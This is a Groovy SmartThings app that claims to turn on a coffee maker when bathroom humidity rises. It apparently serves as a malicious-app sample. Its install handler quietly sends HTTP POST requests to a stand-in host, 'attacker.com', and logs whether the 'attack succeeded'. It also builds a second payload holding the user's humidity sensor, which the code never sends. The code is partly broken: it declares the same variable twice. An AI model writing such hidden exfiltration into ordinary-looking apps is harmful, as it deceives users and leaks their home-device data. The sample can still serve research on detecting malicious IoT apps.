
definition(
    name:"Coffee After Shower",
    namespace:"hwustrack",
    author:"Hans Wustrack",
    description:"This app is designed simply to turn on your coffee machine while you are taking a shower.",
    category:"My Apps",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png")


preferences{
    section("About"){
        paragraph"This app is designed simply to turn on your coffee machine"+
        "while you are taking a shower."
        }
    section("Bathroom humidity sensor"){
        input"bathroom","capability.relativeHumidityMeasurement",title:"Which humidity sensor?"
        }
    section("Coffee maker to turn on"){
        input"coffee","capability.switch",title:"Which switch?"
        }
    section("Humidity level to switch coffee on at"){
        input"relHum","number",title:"Humidity level?",defaultValue:50
        }
}

def installed(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${bathroom}"
    ]
    ]
    subscribe(bathroom,"humidity",coffeeMaker)
}

def updated(){
    unsubscribe()
    subscribe(bathroom,"humidity",coffeeMaker)
}

def coffeeMaker(shower){
    log.info"Humidity value:$shower.value"
    if(shower.value.toInteger()>relHum){
        coffee.on()
    }
}

